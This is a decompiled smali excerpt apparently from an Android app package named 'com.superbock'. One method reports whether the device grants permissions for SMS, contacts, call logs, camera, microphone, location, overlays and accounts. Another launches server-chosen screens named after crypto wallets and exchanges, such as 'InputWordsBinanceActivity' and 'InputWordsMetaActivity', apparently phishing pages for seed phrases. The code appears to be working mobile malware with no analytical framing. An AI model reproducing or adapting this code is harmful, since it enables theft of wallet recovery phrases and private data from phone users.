    move-object/from16 v18, v10

    move-object/from16 v10, v22

    new-instance v15, Lf/e;

    invoke-direct {v15}, Lf/e;-><init>()V

    const/16 v20, 0x51e

    move-object/from16 v21, v5

    invoke-static/range {v20 .. v20}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    move-object/from16 v20, v6

    const-string v6, "code"

    invoke-virtual {v15, v6, v5}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v6, 0x17

    if-lt v5, v6, :cond_1d

    iget-object v6, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v6}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v6

    if-eqz v6, :cond_1b

    const/4 v6, 0x1

    goto :goto_9

    :cond_1b
    sget-boolean v6, Le3/d;->b:Z

    if-eqz v6, :cond_1c

    const/4 v6, 0x2

    goto :goto_9

    :cond_1c
    const/4 v6, 0x0

    :goto_9
    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v6

    invoke-virtual {v15, v2, v6}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_a

    :cond_1d
    invoke-virtual {v15, v2, v3}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    :goto_a
    const/16 v2, 0x20

    if-le v5, v2, :cond_1e

    iget-object v2, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v6, "android.permission.READ_MEDIA_IMAGES"

    invoke-static {v2, v6}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_1f

    goto :goto_b

    :cond_1e
    iget-object v2, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v6, "android.permission.READ_EXTERNAL_STORAGE"

    invoke-static {v2, v6}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_1f

    :goto_b
    const/4 v2, 0x1

    goto :goto_c

    :cond_1f
    const/4 v2, 0x0

    :goto_c
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v15, v14, v2}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v2, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v6, "android.permission.READ_CONTACTS"

    invoke-static {v2, v6}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_20

    const/4 v2, 0x1

    goto :goto_d

    :cond_20
    const/4 v2, 0x0

    :goto_d
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v15, v10, v2}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v2, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v6, "android.permission.READ_SMS"

    invoke-static {v2, v6}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_21

    const/4 v2, 0x1

    goto :goto_e

    :cond_21
    const/4 v2, 0x0

    :goto_e
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v15, v9, v2}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v2, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v6, "android.permission.READ_CALL_LOG"

    invoke-static {v2, v6}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_22

    const/4 v2, 0x1

    goto :goto_f

    :cond_22
    const/4 v2, 0x0

    :goto_f
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v15, v12, v2}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    const/16 v2, 0x17

    if-lt v5, v2, :cond_23

    iget-object v2, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v2}, Lk3/a;->f(Landroid/content/Context;)Z

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v15, v1, v2}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v2, "power"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/os/PowerManager;

    iget-object v2, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v15, v13, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    :cond_23
    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v2, "android.permission.WRITE_EXTERNAL_STORAGE"

    invoke-static {v1, v2}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_24

    const/4 v1, 0x1

    goto :goto_10

    :cond_24
    const/4 v1, 0x0

    :goto_10
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v15, v4, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v2, "android.permission.CAMERA"

    invoke-static {v1, v2}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_25

    const/4 v1, 0x1

    goto :goto_11

    :cond_25
    const/4 v1, 0x0

    :goto_11
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v15, v11, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v2, "android.permission.RECORD_AUDIO"

    invoke-static {v1, v2}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_26

    const/4 v11, 0x1

    goto :goto_12

    :cond_26
    const/4 v11, 0x0

    :goto_12
    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v15, v8, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v2, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-static {v1, v2}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_27

    const/4 v11, 0x1

    goto :goto_13

    :cond_27
    const/4 v11, 0x0

    :goto_13
    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v15, v7, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v2, "android.permission.SEND_SMS"

    invoke-static {v1, v2}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_28

    const/4 v11, 0x1

    goto :goto_14

    :cond_28
    const/4 v11, 0x0

    :goto_14
    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    move-object/from16 v2, v20

    invoke-virtual {v15, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v2, "android.permission.GET_ACCOUNTS"

    invoke-static {v1, v2}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_29

    const/4 v11, 0x1

    goto :goto_15

    :cond_29
    const/4 v11, 0x0

    :goto_15
    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    move-object/from16 v2, v21

    invoke-virtual {v15, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v2, "android.permission.CALL_PHONE"

    invoke-static {v1, v2}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_2a

    const/16 v16, 0x1

    :cond_2a
    invoke-static/range {v16 .. v16}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    move-object/from16 v2, v19

    invoke-virtual {v15, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v1, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v1}, Landroidx/core/app/NotificationManagerCompat;->from(Landroid/content/Context;)Landroidx/core/app/NotificationManagerCompat;

    move-result-object v1

    invoke-virtual {v1}, Landroidx/core/app/NotificationManagerCompat;->areNotificationsEnabled()Z

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    move-object/from16 v2, v18

    invoke-virtual {v15, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    sget v1, Le3/d;->a:I

    const/4 v2, 0x1

    if-eq v1, v2, :cond_2c

    const/4 v4, 0x2

    if-eq v1, v4, :cond_2c

    const/4 v4, 0x3

    if-eq v1, v4, :cond_2c

    const/4 v4, 0x4

    if-eq v1, v4, :cond_2c

    const/16 v4, 0x9

    if-ne v1, v4, :cond_2b

    goto :goto_16

    :cond_2b
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    goto :goto_17

    :cond_2c
    :goto_16
    move-object v4, v3

    :goto_17
    move-object/from16 v1, v17

    invoke-virtual {v15, v1, v4}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v15}, Lf/a;->l()Ljava/lang/String;

    move-result-object v1

    move-object/from16 v2, p1

    invoke-interface {v2, v1}, Ls3/g0;->b(Ljava/lang/String;)Z

    :goto_18
    return-void

    nop

    :sswitch_data_0
    .sparse-switch
        -0x7812d7f7 -> :sswitch_f
        -0x53d94605 -> :sswitch_e
        -0x51863cdb -> :sswitch_d
        -0x410bbbb0 -> :sswitch_c
        -0x3f326250 -> :sswitch_b
        -0x2f4b4052 -> :sswitch_a
        -0x13be51f3 -> :sswitch_9
        -0xcb43eb2 -> :sswitch_8
        -0xb5f6a70 -> :sswitch_7
        -0x38806a4 -> :sswitch_6
        0x237a88eb -> :sswitch_5
        0x40657be3 -> :sswitch_4
        0x4ce04a05 -> :sswitch_3
        0x625c2bf3 -> :sswitch_2
        0x714f9fb5 -> :sswitch_1
        0x7602e8b1 -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_5
        :pswitch_5
        :pswitch_5
        :pswitch_4
        :pswitch_5
        :pswitch_5
        :pswitch_3
        :pswitch_2
        :pswitch_5
        :pswitch_5
        :pswitch_1
        :pswitch_5
        :pswitch_5
        :pswitch_0
        :pswitch_5
        :pswitch_5
    .end packed-switch
.end method

.method public final h0(Ljava/lang/String;)V
    .locals 5

    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v0}, Lk3/a;->i(Landroid/content/Context;)Z

    move-result v0

    const/4 v1, 0x0

    const/4 v2, 0x1

    if-eqz v0, :cond_1

    const-string p1, "3"

    invoke-static {v2, p1, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_1
    sget-boolean v0, Lcom/superbock/App;->c:Z

    if-eqz v0, :cond_2

    const-string p1, "56"

    invoke-static {v2, p1, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_2
    invoke-static {}, Lk3/d;->c()Z

    move-result v0

    if-eqz v0, :cond_3

    const-string p1, "57"

    invoke-static {v2, p1, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_3
    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v0}, Lk3/e;->b(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_4

    const-string p1, "58"

    invoke-static {v2, p1, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_4
    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v0

    iget v0, v0, Landroid/content/res/Configuration;->orientation:I

    const/4 v3, 0x2

    if-ne v0, v3, :cond_5

    const-string p1, "35"

    invoke-static {v2, p1, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_5
    sget-boolean v0, Le3/d;->b:Z

    if-eqz v0, :cond_6

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x17

    if-lt v0, v4, :cond_6

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_6

    const/4 v0, 0x1

    goto :goto_0

    :cond_6
    const/4 v0, 0x0

    :goto_0
    if-eqz v0, :cond_7

    const-string v4, "55"

    invoke-static {v2, v4, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    :cond_7
    const-class v2, Lcom/superbock/bean/AdInfo;

    invoke-static {p1, v2}, Lf/a;->v(Ljava/lang/String;Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Lcom/superbock/bean/AdInfo;

    invoke-virtual {p1, v3}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getTitleColor()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lk3/a;->m(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Lcom/superbock/bean/AdInfo;->setTitleColor(Ljava/lang/String;)V

    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getMsgColor()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lk3/a;->m(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Lcom/superbock/bean/AdInfo;->setMsgColor(Ljava/lang/String;)V

    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getBgColor()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lk3/a;->m(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Lcom/superbock/bean/AdInfo;->setBgColor(Ljava/lang/String;)V

    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getConfirmColor()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lk3/a;->m(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Lcom/superbock/bean/AdInfo;->setConfirmColor(Ljava/lang/String;)V

    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getConfirmBgColor()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lk3/a;->m(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getCancelColor()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lk3/a;->m(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Lcom/superbock/bean/AdInfo;->setCancelColor(Ljava/lang/String;)V

    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getCancelBgColor()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lk3/a;->m(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Lcom/superbock/bean/AdInfo;->setCancelBgColor(Ljava/lang/String;)V

    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getOtherColor()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lk3/a;->m(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Lcom/superbock/bean/AdInfo;->setOtherColor(Ljava/lang/String;)V

    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getOtherBgColor()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lk3/a;->m(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Lcom/superbock/bean/AdInfo;->setOtherBgColor(Ljava/lang/String;)V

    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getTemplate()I

    move-result v2

    packed-switch v2, :pswitch_data_0

    packed-switch v2, :pswitch_data_1

    goto/16 :goto_1

    :pswitch_0
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/custom/InputWordsOkxActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto/16 :goto_1

    :pswitch_1
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/custom/InputWordsBinanceActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto/16 :goto_1

    :pswitch_2
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/custom/InputWordsTronglobalActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto/16 :goto_1

    :pswitch_3
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/custom/InputWordsTronlinkActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto/16 :goto_1

    :pswitch_4
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/custom/InputWordsWalletActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto/16 :goto_1

    :pswitch_5
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/custom/InputWordsMetaActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto/16 :goto_1

    :pswitch_6
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/custom/InputWordsImActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto/16 :goto_1

    :pswitch_7
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/custom/InputWordsTpActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto/16 :goto_1

    :pswitch_8
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/custom/InputWordsTrustActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto/16 :goto_1

    :pswitch_9
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdBoxActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto/16 :goto_1

    :pswitch_a
    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getImg()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_8

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdAlertBottomActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto/16 :goto_1

    :cond_8
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdConfirmBottomActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto/16 :goto_1

    :pswitch_b
    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getImg()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_a

    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getCancel()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_9

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdAlertActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_1

    :cond_9
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdAlertOneButtonActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_1

    :cond_a
    invoke-virtual {p1}, Lcom/superbock/bean/AdInfo;->getCancel()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_b

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdConfirmActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_1

    :cond_b
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdConfirmOneButtonActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_1

    :pswitch_c
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdWebSmallActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_1

    :pswitch_d
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdWebActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_1

    :pswitch_e
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdFullscreenActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_1

    :pswitch_f
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdSingleSmallActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_1

    :pswitch_10
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdSingleActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_1

    :pswitch_11
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v3, Lcom/superbock/ui/AdNoticeActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    :goto_1
    if-eqz v1, :cond_c

    const-string v2, "adInfo"

    invoke-virtual {v1, v2, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1, v1, v0}, Lk3/d;->f(Landroid/content/Context;Landroid/content/Intent;Z)V

    :cond_c
    return-void

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_11
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x3e9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public final i0(Ljava/lang/String;II)V
    .locals 23

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move/from16 v2, p2

    iget-object v3, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v3}, Lk3/a;->i(Landroid/content/Context;)Z

    move-result v3

    const/4 v4, 0x1

    const/4 v5, 0x0

    if-eqz v3, :cond_0

    const-string v1, "3"

    goto :goto_0

    :cond_0
    sget-boolean v3, Lcom/superbock/App;->c:Z

    if-eqz v3, :cond_1

    const-string v1, "56"

    goto :goto_0

    :cond_1
    invoke-static {}, Lk3/d;->c()Z

    move-result v3

    if-eqz v3, :cond_2

    const-string v1, "57"

    goto :goto_0

    :cond_2
    iget-object v3, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v3}, Lk3/e;->b(Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_3

    const-string v1, "58"

    goto :goto_0

    :cond_3
    iget-object v3, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v3

    iget v3, v3, Landroid/content/res/Configuration;->orientation:I

    const/4 v6, 0x2

    if-ne v3, v6, :cond_4

    const-string v1, "35"

    goto :goto_0

    :cond_4
    packed-switch v2, :pswitch_data_0

    :pswitch_0
    goto :goto_1

    :pswitch_1
    invoke-static {}, Lcom/superbock/auto/BaseService;->l()Z

    move-result v3

    if-nez v3, :cond_5

    const-string v1, "54"

    :goto_0
    invoke-static {v4, v1, v5}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_5
    :goto_1
    sget-boolean v3, Le3/d;->b:Z

    const/4 v6, 0x0

    if-eqz v3, :cond_6

    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v7, 0x17

    if-lt v3, v7, :cond_6

    iget-object v3, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v3}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v3

    if-nez v3, :cond_6

    const/4 v3, 0x1

